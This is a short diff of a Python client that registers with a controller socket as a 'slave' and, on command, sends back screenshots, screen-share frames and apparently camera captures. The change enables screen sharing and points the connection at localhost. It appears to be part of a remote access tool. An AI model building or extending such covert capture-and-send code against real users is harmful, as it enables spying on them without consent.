@@ -228,16 +228,16 @@ def send(data, cli):
 
 
 bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-bridge.connect(("192.168.1.36", 9999))
+bridge.connect(("localhost", 9999))
 bridge.send(b"slave")
 
 
 while True:
     command = receive(bridge)
     if command == "screenshare":
-        print("nah")
-
-    if command == "screenshot":
+        send(get_frame(), bridge)
+        
+    elif command == "screenshot":
         send(get_frame(), bridge)
 
     elif command == "camera capture":
